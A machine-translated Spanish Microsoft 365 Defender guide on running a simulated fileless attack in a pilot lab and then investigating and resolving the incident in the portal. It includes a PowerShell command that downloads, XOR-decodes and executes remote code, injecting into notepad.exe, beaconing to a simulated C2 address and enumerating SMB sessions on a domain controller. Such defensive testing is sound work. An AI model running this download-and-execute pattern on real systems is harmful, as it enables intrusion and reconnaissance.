---
title: Ejecutar una simulación de ataque en un Microsoft 365 Defender piloto
description: Ejecute simulaciones de ataques Microsoft 365 Defender para ver cómo se presentan las alertas e incidentes, se ganan conocimientos y se corrigen rápidamente las amenazas.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 3712875579c7d157fe52a5e115d059fc88b4b6d7
ms.sourcegitcommit: bdd6ffc6ebe4e6cb212ab22793d9513dae6d798c
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 03/08/2022
ms.locfileid: "63326501"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Ejecutar una simulación de ataque en un Microsoft 365 Defender piloto


Este artículo es [el paso 1 de 2](eval-defender-investigate-respond.md) en el proceso de realización de una investigación y respuesta de un incidente en Microsoft 365 Defender un entorno piloto. Para obtener más información acerca de este proceso, vea el [artículo de introducción](eval-defender-investigate-respond.md) .

Después de preparar el entorno [piloto, es](eval-defender-investigate-respond.md) hora de probar la respuesta a incidentes de Microsoft 365 Defender y las capacidades automatizadas de investigación y corrección creando un incidente con un ataque simulado y usando el portal de Microsoft 365 Defender para investigar y responder.

Un incidente en Microsoft 365 Defender es una colección de alertas correlacionadas y datos asociados que son la historia de un ataque.

Los servicios y aplicaciones de Microsoft 365 crean alertas cuando detectan un evento o actividad sospechosos o malintencionados. Las alertas individuales proporcionan pistas valiosas sobre un ataque completado o en curso. Sin embargo, los ataques suelen emplear varias técnicas en distintos tipos de entidades, como dispositivos, usuarios y buzones de entrada. El resultado son varias alertas para varias entidades del espacio empresarial.

>[!Note]
>Si es completamente nuevo en el análisis de seguridad y la respuesta a incidentes[](first-incident-overview.md), consulte el tutorial Responder a su primer incidente para obtener una visita guiada a un proceso típico de análisis, corrección y revisión posterior al incidente.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Simular ataques con el portal Microsoft 365 Defender web

El Microsoft 365 Defender cuenta con capacidades integradas para crear ataques simulados en el entorno piloto:

- Aprendizaje de simulación de ataques Microsoft 365 Defender para Office 365 en [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).
  
  En el portal Microsoft 365 Defender, seleccione Correo electrónico **& colaboración > de simulación de ataques**.

- Tutoriales de ataques & simulaciones para Microsoft 365 Defender para Endpoint en [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  En el <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">portal Microsoft 365 Defender</a>, seleccione **Endpoints > Tutoriales & simulaciones**.

### <a name="defender-for-office-365-attack-simulation-training"></a>Defender para el Office 365 de simulación de ataques

Defender para Office 365 con Microsoft 365 E5 o Microsoft Defender para Office 365 Plan 2 incluye entrenamiento de simulación de ataques para ataques de suplantación de identidad. Los pasos básicos son:

1. Crear una simulación

   Para obtener instrucciones paso a paso sobre cómo crear e iniciar una nueva simulación, consulta [Simular un ataque de phishing](/microsoft-365/security/office-365-security/attack-simulation-training).

2. Crear una carga

   Para obtener instrucciones paso a paso sobre cómo crear una carga para su uso dentro de una simulación, consulta Crear una carga personalizada para el aprendizaje de [simulación de ataques](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. Obtener información

   Para obtener instrucciones paso a paso sobre cómo obtener información con los informes, consulta Obtener información a través del [aprendizaje de simulación de ataques](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

Para obtener más información, consulte [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Tutoriales de ataque de Defender for Endpoint & simulaciones

Estas son las simulaciones de Defender para puntos de conexión de Microsoft:

- El documento deja atrás la puerta trasera
- Investigación automatizada (puerta trasera)

Hay simulaciones adicionales de orígenes de terceros. También hay un conjunto de tutoriales.

Para cada simulación o tutorial:

1. Descargue y lea el documento de acceso completo correspondiente proporcionado.

2. Descargue el archivo de simulación. Puedes elegir descargar el archivo o script en el dispositivo de prueba, pero no es obligatorio.

3. Ejecute el archivo de simulación o el script en el dispositivo de prueba como se indica en el documento de paso a paso.

 Para obtener más información, vea [Experience Microsoft Defender for Endpoint through simulated attack](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Simular un ataque con un controlador de dominio aislado y un dispositivo cliente (opcional)

En este ejercicio de respuesta a incidentes opcional, simulará un ataque a un controlador de dominio de Servicios de dominio de Active Directory (AD DS) aislado y un dispositivo Windows mediante un script de PowerShell y, a continuación, investigará, corregirá y resolverá el incidente.

En primer lugar, debe agregar puntos de conexión al entorno piloto.

### <a name="add-pilot-environment-endpoints"></a>Agregar extremos de entorno piloto

En primer lugar, debes agregar un controlador de dominio de AD DS aislado y un dispositivo Windows a tu entorno piloto.

1. Compruebe que el inquilino del entorno piloto [ha habilitado Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Compruebe que el controlador de dominio:

   - Ejecuta Windows Server 2008 R2 o una versión posterior.
   - Informa a [Microsoft Defender para Identity](/azure/security-center/security-center-wdatp) y ha habilitado [la administración remota](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Tiene [habilitada la integración de Microsoft Defender para Identidad y Microsoft Defender para Aplicaciones en la nube](/cloud-app-security/mdi-integration) .
   - Tiene un usuario de prueba creado en el dominio de prueba. No se necesitan permisos de nivel de administrador.

3. Compruebe que el dispositivo de prueba:

   - Ejecuta Windows 10 versión 1903 o una versión posterior.
   - Está unido al dominio del controlador de dominio de AD DS.
   - Tiene [Antivirus de Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) habilitada. Si tiene problemas para habilitar Antivirus de Windows Defender, consulte este tema [de solución de problemas](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - Se [incorpora a Microsoft Defender para endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Si usas grupos de inquilinos y dispositivos, crea un grupo de dispositivos dedicado para el dispositivo de prueba y lo insertas en el nivel superior.

Una alternativa es hospedar el controlador de dominio de AD DS y probar el dispositivo como máquinas virtuales en Microsoft Azure de infraestructura. Puede usar las instrucciones de la fase [1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet) de la Guía de laboratorio de pruebas de empresa simulada, pero omitir la creación de la máquina virtual APP1.

Este es el resultado.

![Puntos de conexión para el entorno de evaluación de Defender mediante la Guía de laboratorio de pruebas de empresa simulada.](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

Simularás un ataque sofisticado que aprovecha técnicas avanzadas para ocultarte de la detección. El ataque enumera las sesiones de bloque de mensajes de servidor (SMB) abiertas en controladores de dominio y recupera las direcciones IP recientes de los dispositivos de los usuarios. Esta categoría de ataques normalmente no incluye archivos descartados en el dispositivo de la víctima y se producen únicamente en la memoria. "Viven fuera de la tierra" mediante el uso de herramientas administrativas y del sistema existentes e insertan su código en procesos del sistema para ocultar su ejecución. Este comportamiento les permite eludir la detección y persistir en el dispositivo.

En esta simulación, nuestro escenario de ejemplo comienza con un script de PowerShell. In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network. La detección de estos scripts puede ser difícil porque los administradores también suelen ejecutar scripts de forma remota para llevar a cabo diversas actividades administrativas.

![Ataque de PowerShell sin archivos con inyección de procesos y diagrama de ataque de reconocimiento SMB.](../../media/mtp/mtpdiydiagram.png)

Durante la simulación, el ataque inserta el shellcode en un proceso aparentemente inocente. El escenario requiere el uso de notepad.exe. Elegimos este proceso para la simulación, pero es más probable que los atacantes se den como destino a un proceso de sistema de larga ejecución, como svchost.exe. A continuación, el shellcode pasa a ponerse en contacto con el servidor de comandos y control (C2) del atacante para recibir instrucciones sobre cómo continuar. El script intenta ejecutar consultas de reconocimiento en el controlador de dominio (DC). El reconocimiento permite a un atacante obtener información sobre la información de inicio de sesión del usuario reciente. Una vez que los atacantes tienen esta información, pueden moverse lateralmente en la red para llegar a una cuenta confidencial específica

> [!IMPORTANT]
> Para obtener resultados óptimos, sigue las instrucciones de simulación de ataque lo más de cerca posible.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Ejecutar la simulación de ataque de controlador de dominio de AD DS aislado

Para ejecutar la simulación del escenario de ataque:

1. Asegúrese de que el entorno piloto incluye el controlador de dominio de AD DS aislado y Windows dispositivo.

2. Inicie sesión en el dispositivo de prueba con la cuenta de usuario de prueba.

3. Abre una Windows PowerShell en el dispositivo de prueba.

4. Copie el siguiente script de simulación:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Si abre este artículo en un explorador web, es posible que tenga problemas para copiar el texto completo sin perder determinados caracteres ni introducir saltos de línea adicionales. Si este es el caso, descargue este documento y ábralo en Adobe Reader.

5. Pegue y ejecute el script copiado en la ventana de PowerShell.

> [!NOTE]
> Si ejecuta PowerShell con el protocolo de escritorio remoto (RDP), use el comando Escribir texto del Portapapeles en el cliente RDP porque es posible que la tecla rápida **CTRL-V** o el método de clic y pegado con el botón secundario no funcionen. Las versiones recientes de PowerShell a veces tampoco aceptarán ese método, es posible que deba copiarlo en Bloc de notas en la memoria primero, copiarlo en la máquina virtual y, a continuación, pegarlo en PowerShell.

Unos segundos más tarde, se abrirá Bloc de notas aplicación. Se insertará un código de ataque simulado en Bloc de notas. Mantenga abierta la instancia de Bloc de notas generada automáticamente para experimentar el escenario completo.

El código de ataque simulado intentará comunicarse con una dirección IP externa (simulando el servidor C2) y, a continuación, intentará reconocimiento con el controlador de dominio a través de SMB.

Verá este mensaje en la consola de PowerShell cuando se complete este script:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Para ver la característica De incidentes y respuesta automatizados en acción, mantenga abierto notepad.exe proceso. Verá Que los incidentes automatizados y la respuesta detengan el Bloc de notas proceso.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Investigar el incidente del ataque simulado

> [!NOTE]
> Antes de ayudarle a través de esta simulación, vea el siguiente vídeo para ver cómo la administración de incidentes le ayuda a crear las alertas relacionadas como parte del proceso de investigación, donde puede encontrarla en el portal y cómo puede ayudarle en las operaciones de seguridad:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Al cambiar al punto de vista del analista soc, ahora puede empezar a investigar el ataque en el portal de Microsoft 365 Defender web.

1. Abra el <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender web</a>.

2. En el panel de navegación, seleccione **Incidentes & alertas > incidentes**.

3. El nuevo incidente del ataque simulado aparecerá en la cola de incidentes.

    ![Ejemplo de la cola de incidentes.](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a>Investigar el ataque como un solo incidente

Microsoft 365 Defender correlaciona análisis y agrega todas las alertas e investigaciones relacionadas de diferentes productos en una entidad de incidentes. Al hacerlo, Microsoft 365 Defender muestra una historia de ataque más amplia, lo que permite al analista de SOC comprender y responder a amenazas complejas.

Las alertas generadas durante esta simulación están asociadas con la misma amenaza y, como resultado, se agregan automáticamente como un único incidente.

Para ver el incidente:

1. Abra el <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender web</a>.

2. En el panel de navegación, seleccione **Incidentes & alertas > incidentes**.

3. Seleccione el elemento más reciente haciendo clic en el círculo situado a la izquierda del nombre del incidente. Un panel lateral muestra información adicional sobre el incidente, incluidas todas las alertas relacionadas. Cada incidente tiene un nombre único que lo describe en función de los atributos de las alertas que incluye.

   Las alertas que se muestran en el panel se pueden filtrar en función de los recursos de servicio: Microsoft Defender para identidad, Microsoft Defender para aplicaciones en la nube, Microsoft Defender para endpoint, Microsoft 365 Defender y Microsoft Defender para Office 365.

3. Seleccione **Abrir página de incidentes** para obtener más información sobre el incidente.

   En la **página** Incidente, puede ver todas las alertas e información relacionadas con el incidente. La información incluye las entidades y activos que participan en la alerta, el origen de detección de las alertas (como Microsoft Defender para Identity o Microsoft Defender para Endpoint) y el motivo por el que se vincularon. Al revisar la lista de alertas de incidentes se muestra la progresión del ataque. Desde esta vista, puede ver e investigar las alertas individuales.

   También puede hacer clic en **Administrar incidente** en el menú de la derecha, para etiquetar el incidente, asignarlo a usted mismo y agregar comentarios.

#### <a name="review-generated-alerts"></a>Revisar alertas generadas

Veamos algunas de las alertas generadas durante el ataque simulado.

> [!NOTE]
> Solo recorreremos algunas de las alertas generadas durante el ataque simulado. Según la versión de Windows y los productos Microsoft 365 Defender que se ejecutan en el dispositivo de prueba, es posible que veas más alertas que aparecen en un orden ligeramente diferente.

![Ejemplo de las alertas generadas.](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Alerta: Se observó una inyección de proceso sospechosa (Origen: Microsoft Defender para endpoint)

Los atacantes avanzados usan métodos sofisticados y furtivos para conservar la memoria y ocultarse de las herramientas de detección. Una técnica común es operar desde dentro de un proceso de sistema de confianza en lugar de un ejecutable malintencionado, lo que hace difícil que las herramientas de detección y las operaciones de seguridad detecten el código malintencionado.

Para permitir que los analistas de SOC puedan detectar estos ataques avanzados, los sensores de memoria profunda de Microsoft Defender para endpoint proporcionan a nuestro servicio en la nube una visibilidad sin precedentes de una variedad de técnicas de inyección de código entre procesos. En la siguiente figura se muestra cómo Defender for Endpoint detectó y alertó sobre el intento de insertar código en <i>notepad.exe</i>.

![Ejemplo de la alerta para la inyección de código potencialmente malintencionado.](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Alerta: comportamiento inesperado observado por un proceso ejecutado sin argumentos de línea de comandos (Source: Microsoft Defender for Endpoint)

Las detecciones de Puntos de conexión de Microsoft Defender suelen tener como destino el atributo más común de una técnica de ataque. Este método garantiza la durabilidad y aumenta la barra para que los atacantes cambien a tácticas más recientes.

Empleamos algoritmos de aprendizaje a gran escala para establecer el comportamiento normal de los procesos comunes dentro de una organización y en todo el mundo y observamos cuándo estos procesos muestran comportamientos anómalos. Estos comportamientos anómalos a menudo indican que se introdujo código extraño y se está ejecutando en un proceso de confianza.

En este escenario, el proceso <i>notepad.exe</i> muestra un comportamiento anormal, que implica la comunicación con una ubicación externa. Este resultado es independiente del método específico usado para introducir y ejecutar el código malintencionado.

> [!NOTE]
> Dado que esta alerta se basa en modelos de aprendizaje automático que requieren procesamiento back-end adicional, puede tardar algún tiempo antes de ver esta alerta en el portal.

Tenga en cuenta que los detalles de la alerta incluyen la dirección IP externa, un indicador que puede usar como pivote para expandir la investigación.

Seleccione la dirección IP en el árbol del proceso de alerta para ver la página de detalles de la dirección IP.

![Ejemplo de la alerta de comportamiento inesperado de un proceso ejecutado sin argumentos de línea de comandos.](../../media/mtp/fig8.png)

En la siguiente figura se muestra la página de detalles de dirección IP seleccionada (haciendo clic en dirección IP en el árbol de proceso alerta).

![Ejemplo de la página de detalles de la dirección IP.](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Alerta: Reconocimiento de direcciones IP y de usuario (SMB) (Origen: Microsoft Defender para la identidad)

La enumeración mediante el protocolo bloque de mensajes de servidor (SMB) permite a los atacantes obtener información de inicio de sesión de usuario reciente que les ayuda a moverse lateralmente por la red para obtener acceso a una cuenta confidencial específica.

En esta detección, se desencadena una alerta cuando la enumeración de sesión SMB se ejecuta en un controlador de dominio.

![Ejemplo de la alerta de Microsoft Defender para identidad para reconocimiento de direcciones IP y de usuario.](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Revisar la escala de tiempo del dispositivo con Microsoft Defender para endpoint

Después de explorar las distintas alertas de este incidente, vuelva a la página de incidentes que investigó anteriormente. Selecciona la **pestaña Dispositivos** en la página incidente para revisar los dispositivos implicados en este incidente según lo informado por Microsoft Defender para Endpoint y Microsoft Defender for Identity.

Selecciona el nombre del dispositivo donde se realizó el ataque para abrir la página de entidad para ese dispositivo específico. En esa página, puede ver alertas que se desencadenaron y eventos relacionados.

Selecciona la **pestaña** Escala de tiempo para abrir la escala de tiempo del dispositivo y ver todos los eventos y comportamientos observados en el dispositivo en orden cronológico, intercalados con las alertas generadas.

![Ejemplo de la escala de tiempo del dispositivo con comportamientos.](../../media/mtp/fig11.png)

La expansión de algunos de los comportamientos más interesantes proporciona detalles útiles, como árboles de proceso.

Por ejemplo, desplácese hacia abajo hasta que encuentre el evento de alerta **Se observó la inyección de proceso sospechoso**. Seleccione el **powershell.exe para** notepad.exe de proceso debajo de él, para mostrar el árbol de proceso completo para este comportamiento en el gráfico Entidades **de** eventos en el panel lateral. Use la barra de búsqueda para filtrar si es necesario.

![Ejemplo del árbol de procesos para el comportamiento de creación de archivos de PowerShell seleccionado.](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Revisar la información del usuario con Microsoft Defender para aplicaciones en la nube

En la página incidente, seleccione la **pestaña Usuarios** para mostrar la lista de usuarios implicados en el ataque. La tabla contiene información adicional sobre cada usuario, incluida la puntuación prioridad de **investigación de cada** usuario.

Seleccione el nombre de usuario para abrir la página de perfil del usuario donde se puede llevar a cabo una investigación adicional. [Obtenga más información sobre cómo investigar usuarios riesgosos](/cloud-app-security/tutorial-ueba#identify).

![Ejemplo de página de usuario defender para aplicaciones en la nube.](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a>Investigación y corrección automatizadas

> [!NOTE]
>Antes de ayudarle a través de esta simulación, vea el siguiente vídeo para familiarizarse con lo que es la autoproducción automatizada, dónde encontrarla en el portal y cómo puede ayudar en las operaciones de seguridad:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Vuelva al incidente en el portal de Microsoft 365 Defender web. La **pestaña Investigaciones** **de la página** Incidentes muestra las investigaciones automatizadas desencadenadas por Microsoft Defender para Identity y Microsoft Defender para endpoint. La captura de pantalla siguiente muestra solo la investigación automatizada desencadenada por Defender for Endpoint. De forma predeterminada, Defender para endpoint corrige automáticamente los artefactos encontrados en la cola, lo que requiere corrección.

![Ejemplo de las investigaciones automatizadas relacionadas con el incidente.](../../media/mtp/fig14.png)

Seleccione la alerta que desencadenó una investigación para abrir la **página Detalles de la** investigación. Verá los siguientes detalles:

- Alertas que desencadenaron la investigación automatizada.
- Usuarios y dispositivos afectados. Si se encuentran indicadores en dispositivos adicionales, estos dispositivos adicionales también aparecerán en la lista.
- Lista de pruebas. Las entidades encontradas y analizadas, como archivos, procesos, servicios, controladores y direcciones de red. Estas entidades se analizan para posibles relaciones con la alerta y se califican como benignas o malintencionadas.
- Amenazas encontradas. Amenazas conocidas que se encuentran durante la investigación.

> [!NOTE]
> Según el tiempo, es posible que la investigación automatizada aún se esté ejecutando. Espere unos minutos a que se complete el proceso antes de recopilar y analizar la evidencia y revisar los resultados. Actualice la **página Detalles de investigación** para obtener los resultados más recientes.

![Ejemplo de la página Detalles de investigación.](../../media/mtp/fig15.png)

Durante la investigación automatizada, Microsoft Defender para Endpoint identificó el proceso notepad.exe, que se inyectó como uno de los artefactos que requerían corrección. Defender for Endpoint detiene automáticamente la inyección de procesos sospechosos como parte de la corrección automatizada.

Puedes ver cómo <i>notepad.exe</i> de la lista de procesos en ejecución en el dispositivo de prueba.

#### <a name="resolve-the-incident"></a>Resolver el incidente

Una vez completada la investigación y confirmada su corrección, resolverá el incidente.

En la **página** Incidente, seleccione **Administrar incidente**. Establezca el estado en **Resolver incidente** y seleccione **Alerta verdadera** para la clasificación y **pruebas de seguridad** para la determinación.

![Ejemplo de la página incidentes con el panel administrar incidentes abierto donde puede resolver el incidente.](../../media/mtp/fig16.png)

Cuando se resuelve el incidente, resuelve todas las alertas asociadas en el portal Microsoft 365 Defender y los portales relacionados.

Esto ajusta las simulaciones de ataque para el análisis de incidentes, la investigación automatizada y la resolución de incidentes.

## <a name="next-step"></a>Paso siguiente

[![Pruebe Microsoft 365 Defender capacidades de respuesta a incidentes.](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)

Paso 2 de 2: [Probar Microsoft 365 Defender capacidades de respuesta a incidentes](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>Navegación que puede necesitar

[Crear el entorno Microsoft 365 Defender evaluación](eval-create-eval-environment.md)
